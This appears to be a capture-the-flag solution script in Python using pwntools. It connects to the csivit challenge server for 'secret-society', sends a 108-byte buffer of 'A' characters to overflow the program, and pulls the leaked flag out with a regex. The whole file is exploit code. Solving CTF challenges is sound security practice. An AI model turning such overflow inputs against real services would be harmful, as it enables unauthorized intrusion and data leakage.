#!/usr/bin/env python

from pwn import *

HOST = 'chall.csivit.com' 
PORT = 30041

context.log_level = 'error'

# e = ELF('./secret-society')
# io = e.process()
io = remote(HOST, PORT)

io.recvline()
io.sendline(b'A' * 108)
m = re.search(b'csivit{.*}', io.recv())
print(m[0].decode())